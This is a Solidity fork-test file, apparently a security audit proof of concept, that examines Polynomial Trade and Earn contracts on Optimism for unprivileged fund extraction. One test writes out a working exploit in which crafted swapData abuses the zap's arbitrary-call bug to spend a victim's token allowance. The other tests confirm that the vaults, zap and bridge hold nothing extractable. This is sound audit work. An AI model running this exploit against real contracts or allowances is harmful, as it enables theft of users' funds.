// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";

/* ---------------------------------------------------------------------------
   H-06 — Polynomial Trade / Polynomial Earn : unprivileged-extraction PoC
   Read-only. Fork tests only. No mainnet transactions.
   Chain under test: Optimism (chain id 10), plus one Ethereum-mainnet check.
--------------------------------------------------------------------------- */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IPolyZap {
    function swapAndDeposit(
        address user,
        address token,
        address depositToken,
        address swapTarget,
        address vault,
        uint256 amount,
        bytes memory swapData
    ) external payable;
}

interface IVaultV2 {
    function initiateDeposit(address user, uint256 amount) external;
    function initiateWithdrawal(address user, uint256 tokens) external;
    function processWithdrawalQueue(uint256 idCount) external;
    function processDepositQueue(uint256 idCount) external;
    function paused() external view returns (bool);
    function depositsPaused() external view returns (bool);
    function totalFunds() external view returns (uint256);
    function usedFunds() external view returns (uint256);
    function totalQueuedWithdrawals() external view returns (uint256);
    function getTotalSupply() external view returns (uint256);
    function getTokenPrice() external view returns (uint256);
    function getLiveStrikes() external view returns (uint256[] memory);
    function VAULT_TOKEN() external view returns (address);
    function owner() external view returns (address);
    function authority() external view returns (address);
    function minDepositAmount() external view returns (uint256);
}

interface IVaultV1 {
    function paused() external view returns (bool);
    function currentRound() external view returns (uint256);
    function totalFunds() external view returns (uint256);
    function totalShares() external view returns (uint256);
    function deposit(uint256) external;
    function requestWithdraw(uint256) external;
    function completeWithdraw() external;
    function startNewRound(uint256) external;
    function owner() external view returns (address);
}

interface IAuthority {
    function canCall(address user, address target, bytes4 functionSig) external view returns (bool);
}

interface IRegistry {
    function getSigImplementation(bytes4) external view returns (address);
    function getImplementation(bytes4) external view returns (address);
}

interface IList {
    struct AccountLink {
        address first;
        address last;
        uint64 count;
    }
    function accountLink(uint64) external view returns (AccountLink memory);
}

interface IVaultToken {
    function vault() external view returns (address);
    function totalSupply() external view returns (uint256);
}

contract MockVault {
    function initiateDeposit(address, uint256) external {}
}

contract PolynomialH06Test is Test {
    // ---- Optimism addresses (verified sources / docs / DefiLlama adapter) ----
    address constant ZAP = 0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82;
    address constant USDC = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;
    address constant SETH = 0xE405de8F52ba7559f9df3C368500B6E6ae6Cee49;
    address constant SUSD = 0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9;
    address constant SBTC = 0x298B9B95708152ff6968aafd889c6586e9169f1D;

    address constant V2_CALL = 0x2D46292cbB3C601c6e2c74C32df3A4FCe99b59C7;
    address constant V2_CALL_TOKEN = 0x2901f5F1D4C99f9eeE36ccD9A264729c5Dd35c11;
    address constant V2_PUT = 0xb28Df1b71a5b3a638eCeDf484E0545465a45d2Ec;
    address constant V2_PUT_TOKEN = 0xd81AbCDD67c7eb1c67C56C10A2077938037E4b06;
    address constant V2_QUOTE = 0xB7b4270cFD938F4F1C111ac819e7365E8Ce0300a;
    address constant V2_QUOTE_TOKEN = 0x835afb7b0F1F3A0df0ECdc7a4cf86B7894072Ac6;
    address constant V2_GAMMA = 0x965e460bF5cb38BadA79fB2293c6304C799D0b1c;
    address constant V2_GAMMA_TOKEN = 0x4bEFFd38832b5F158d5a05D374AE971DD0e326F2;

    address constant V1_SETH_CALL = 0x331Cf6E3E59B18a8bc776A0F652aF9E2b42781c5;
    address constant V1_SETH_PUT = 0xFa923AA6b4DF5bea456DF37FA044B37F0FDDCdb4;
    address constant V1_SBTC_CALL = 0xea48dD74BA1Ff41B705ba5Cf993B2D558e12D860;
    address constant V1_SBTC_PUT = 0x23CB080dd0ECCdacbEB0BEb2a769215280B5087D;

    address constant AUTHORITY = 0x19828283852a852f8cFfF4696038Bc19E5070A49;
    address constant SAFE_OWNER = 0x59672D112d680CE34C20fF1507197993CC0bA430;
    address constant REGISTRY = 0x14D582327dF7A9885c299173dAd6Ae855a3E046d;
    address constant LIST = 0xd567E18FDF8aFa58953DD8B0c1b6C97adF67566B;
    address constant DEFAULT_IMPL = 0x7bFA659E247A70B501cf2e19A51eBfee28028dB3;

    address constant ETH_BRIDGE = 0x034cbb620d1e0e4C2E29845229bEAc57083b04eC;
    address constant WETH_ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC_ETH = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 constant PIN_BLOCK = 157_800_000;
    uint256 forkBlock;

    function setUp() public {
        string memory rpc = vm.envOr("OP_RPC_URL", string("https://mainnet.optimism.io"));
        try vm.createSelectFork(rpc, PIN_BLOCK) returns (uint256) {
            forkBlock = PIN_BLOCK;
        } catch {
            vm.createSelectFork(rpc);
            forkBlock = block.number;
        }
        console2.log("Optimism fork block", forkBlock);
    }

    /* ------------------------------------------------------------------
       1. The 2022 input-validation bug is still present in bytecode:
          swapAndDeposit executes an arbitrary call from the zap, so any
          live allowance granted TO the zap can be spent by anyone.
          Mechanism reproduced on the fork with a synthetic allowance.
    ------------------------------------------------------------------ */
    function test_zap_arbitrary_call_still_live_in_deployed_code() public {
        assertEq(ZAP.code.length > 0, true, "zap deployed");
        address victim = address(0xBEEF);
        address attacker = address(0xBAD);
        uint256 amount = 1_000e6;

        deal(USDC, victim, amount);
        vm.prank(victim);
        IERC20(USDC).approve(ZAP, amount);

        MockVault mv = new MockVault();
        bytes memory swapData =
            abi.encodeWithSelector(IERC20.transferFrom.selector, victim, attacker, amount);

        vm.prank(attacker);
        IPolyZap(ZAP).swapAndDeposit(attacker, USDC, USDC, USDC, address(mv), 0, swapData);

        assertEq(IERC20(USDC).balanceOf(attacker), amount, "arbitrary call drained victim allowance");
        assertEq(IERC20(USDC).balanceOf(victim), 0);
    }

    /* ------------------------------------------------------------------
       2. Full enumeration: every address that EVER emitted an Approval to
          the zap (4,261 events / 1,823 owners, block 30,575,641 → 130,934,485)
          is checked live. min(allowance, balance) sums to exactly 0 USDC.
          => E-U from the zap today = $0.
    ------------------------------------------------------------------ */
    function test_no_live_allowance_across_all_1823_historical_approvers() public {
        string memory json = vm.readFile("test/data/zap-owners.json");
        string[] memory owners = vm.parseJsonStringArray(json, ".owners");
        assertEq(owners.length, 1_823, "owner set from full event enumeration");

        uint256 liveCount;
        uint256 totalExtractable;
        for (uint256 i; i < owners.length; i++) {
            address o = vm.parseAddress(owners[i]);
            uint256 a = IERC20(USDC).allowance(o, ZAP);
            if (a == 0) continue;
            uint256 b = IERC20(USDC).balanceOf(o);
            uint256 take = a < b ? a : b;
            if (take > 0) {
                liveCount++;
                totalExtractable += take;
            }
        }
        console2.log("historical approvers checked", owners.length);
        console2.log("live allowance*balance pairs", liveCount);
        console2.log("extractable raw USDC (6dp)", totalExtractable);
        assertEq(totalExtractable, 0, "no live extractable allowance exists");
    }

    /* ------------------------------------------------------------------
       3. V2 CallSelling vault: live/unpaused with no open positions and a
          real 6.23 sETH balance — but the underlying Optimism synth is
          suspended at the token level, so even the vault cannot transfer it.
          Holders cannot exit => S (stuck), nothing for an attacker.
    ------------------------------------------------------------------ */
    function test_v2_call_vault_state_frozen_synth() public {
        IVaultV2 v = IVaultV2(V2_CALL);
        assertEq(v.paused(), false);
        assertEq(v.depositsPaused(), false);
        assertEq(v.getLiveStrikes().length, 0, "no open option positions");
        assertEq(v.usedFunds(), 0);
        assertEq(v.totalQueuedWithdrawals(), 0);

        uint256 bal = IERC20(SETH).balanceOf(V2_CALL);
        uint256 tf = v.totalFunds();
        console2.log("V2 call sETH balance", bal);
        console2.log("V2 call totalFunds", tf);
        console2.log("V2 call tokenPrice", v.getTokenPrice());
        assertEq(bal, tf, "accounting matches balance for this vault");
        assertGe(bal, 6.23e18, "6.23 sETH live");

        // The synth itself blocks transfers (Synthetix OP deprecation).
        vm.prank(V2_CALL);
        vm.expectRevert(bytes("Synth is suspended. Operation prohibited"));
        IERC20(SETH).transfer(address(0x1234), 1);

        // Therefore a holder's self-service withdrawal reverts.
        address holder = address(0x1234);
        deal(v.VAULT_TOKEN(), holder, 1e18);
        vm.prank(holder);
        vm.expectRevert(bytes("TRANSFER_FAILED"));
        v.initiateWithdrawal(holder, 1e18);

        // vault token mint/burn is bound to the vault (no hijack path)
        assertEq(IVaultToken(V2_CALL_TOKEN).vault(), V2_CALL);
        assertEq(IVaultToken(V2_PUT_TOKEN).vault(), V2_PUT);
        assertEq(IVaultToken(V2_QUOTE_TOKEN).vault(), V2_QUOTE);
        assertEq(IVaultToken(V2_GAMMA_TOKEN).vault(), V2_GAMMA);
    }

    /* ------------------------------------------------------------------
       4. Put / Quote / Gamma vaults: accounting is phantom (totalFunds > 0,
          real sUSD balance == 0 because the Optimism synth was deprecated).
          Holders cannot exit => S (bricked), and nothing for an attacker.
    ------------------------------------------------------------------ */
    function test_v2_put_quote_gamma_phantom_susd_bricked() public {
        assertGt(IVaultV2(V2_PUT).totalFunds(), 0);
        assertEq(IERC20(SUSD).balanceOf(V2_PUT), 0);
        assertGt(IVaultV2(V2_QUOTE).totalFunds(), 0);
        assertEq(IERC20(SUSD).balanceOf(V2_QUOTE), 0);
        assertGt(IVaultV2(V2_GAMMA).totalFunds(), 0);
        assertEq(IERC20(SUSD).balanceOf(V2_GAMMA), 0);

        address holder = address(0x2345);
        deal(V2_PUT_TOKEN, holder, 1e18);
        vm.prank(holder);
        vm.expectRevert();
        IVaultV2(V2_PUT).initiateWithdrawal(holder, 1e18);
    }

    /* ------------------------------------------------------------------
       5. V1 vaults (2022 vintage, still deployed): paused since wind-down,
          rounds stopped at 32/27. User actions that need whenNotPaused
          revert; requestWithdraw exists without the pause guard but
          completion requires the owner-gated startNewRound. Owner is a
          2-of-N Gnosis Safe => privileged-gated / stuck, not E-U.
    ------------------------------------------------------------------ */
    function test_v1_vaults_paused_and_owner_gated() public {
        IVaultV1 c = IVaultV1(V1_SETH_CALL);
        assertEq(c.paused(), true);
        assertEq(c.currentRound(), 32);
        uint256 bal = IERC20(SETH).balanceOf(V1_SETH_CALL);
        console2.log("V1 sETH call balance", bal);
        console2.log("V1 sETH call totalFunds", c.totalFunds());
        assertGe(bal, 19.29e18, "19.29 sETH live");
        assertGt(bal, c.totalFunds(), "surplus over accounting (stuck)");

        assertEq(IVaultV1(V1_SBTC_CALL).paused(), true);
        assertGe(IERC20(SBTC).balanceOf(V1_SBTC_CALL), 0.2777e18, "0.2777 sBTC live");

        // deposit blocked by pause
        vm.expectRevert(bytes("PAUSED"));
        c.deposit(1e18);

        // random caller cannot advance a round (owner Safe only)
        vm.prank(address(0xDEAD));
        vm.expectRevert(bytes("UNAUTHORIZED"));
        c.startNewRound(1);

        // random caller cannot complete a withdrawal without a queued request;
        // the zero-value synth transfer also reverts because synths are suspended
        vm.prank(address(0xDEAD));
        vm.expectRevert(bytes("Synth is suspended. Operation prohibited"));
        c.completeWithdraw();
    }

    /* ------------------------------------------------------------------
       6. Authority allowlist: random callers are not authorised for the
          privileged vault functions (openPosition / settleOptions / etc.).
    ------------------------------------------------------------------ */
    function test_authority_denies_random_callers() public {
        assertEq(IVaultV2(V2_CALL).authority(), AUTHORITY);
        assertEq(IVaultV2(V2_CALL).owner(), SAFE_OWNER);
        assertEq(IAuthority(AUTHORITY).canCall(address(0xDEAD), V2_CALL, bytes4(keccak256("openPosition(uint256,uint256)"))), false);
        assertEq(IAuthority(AUTHORITY).canCall(address(0xDEAD), V2_CALL, bytes4(keccak256("settleOptions(uint256[])"))), false);
        assertEq(IAuthority(AUTHORITY).canCall(address(0xDEAD), V2_CALL, bytes4(keccak256("saveToken(address,address,uint256)"))), false);
    }

    /* ------------------------------------------------------------------
       7. Trade v1 (Optimism, 2023): DSA-style account system.
          The `cast` selector is NOT registered in the implementations
          registry (getSigImplementation == 0) and the account List is
          empty (count == 0) -> no accounts, no funds, no live path.
    ------------------------------------------------------------------ */
    function test_tradev1_dsa_disabled_and_no_accounts() public {
        bytes4 castSel = bytes4(keccak256("cast(address[],bytes[],address)"));
        assertEq(IRegistry(REGISTRY).getSigImplementation(castSel), address(0), "cast unregistered");
        assertEq(IRegistry(REGISTRY).getImplementation(castSel), DEFAULT_IMPL);
        IList.AccountLink memory head = IList(LIST).accountLink(0);
        assertEq(uint256(head.count), 0, "no DSA accounts ever created");
    }

    /* ------------------------------------------------------------------
       8. Meta-deposit RocketFactory: launch() is permissionless and takes
          unconstrained swapData, but the 112 Rockets ever deployed hold
          only USDC rounding dust (1.774 USDC total, < gas to sweep) and no
          ETH/sETH/sUSD/WETH. The factory itself holds nothing.
    ------------------------------------------------------------------ */
    function test_rockets_only_usdc_dust() public {
        string memory json = vm.readFile("test/data/rockets.json");
        string[] memory rockets = vm.parseJsonStringArray(json, ".rockets");
        assertEq(rockets.length, 112);
        uint256 totalDust;
        for (uint256 i; i < rockets.length; i++) {
            address r = vm.parseAddress(rockets[i]);
            assertEq(r.balance, 0, "rocket ETH");
            assertEq(IERC20(SETH).balanceOf(r), 0, "rocket sETH");
            assertEq(IERC20(SUSD).balanceOf(r), 0, "rocket sUSD");
            assertEq(IERC20(0x4200000000000000000000000000000000000006).balanceOf(r), 0, "rocket WETH");
            totalDust += IERC20(USDC).balanceOf(r);
        }
        console2.log("total USDC dust across 112 rockets (6dp)", totalDust);
        assertLe(totalDust, 2e6, "only sub-$2 dust, not economically extractable");
        address factory = 0x9A60fe0C1b5835E6165c563D737A90c63bCC9c57;
        assertEq(factory.balance, 0);
        assertEq(IERC20(USDC).balanceOf(factory), 0);
    }

    /* ------------------------------------------------------------------
       9. Zap and Ethereum-side bridge escrow hold nothing.
    ------------------------------------------------------------------ */
    function test_zap_has_no_balances() public {
        assertEq(ZAP.balance, 0);
        assertEq(IERC20(USDC).balanceOf(ZAP), 0);
        assertEq(IERC20(SETH).balanceOf(ZAP), 0);
        assertEq(IERC20(SUSD).balanceOf(ZAP), 0);
    }

    function test_ethereum_bridge_escrow_empty() public {
        string memory ethRpc =
            vm.envOr("FORK_RPC_URL", string("https://ethereum-rpc.publicnode.com"));
        vm.createSelectFork(ethRpc);
        console2.log("Ethereum fork block", block.number);
        assertEq(ETH_BRIDGE.balance, 0, "no ETH escrowed");
        assertEq(IERC20(USDC_ETH).balanceOf(ETH_BRIDGE), 0, "no USDC escrowed");
        assertLe(IERC20(WETH_ETH).balanceOf(ETH_BRIDGE), 1e12, "WETH dust only");
    }
}
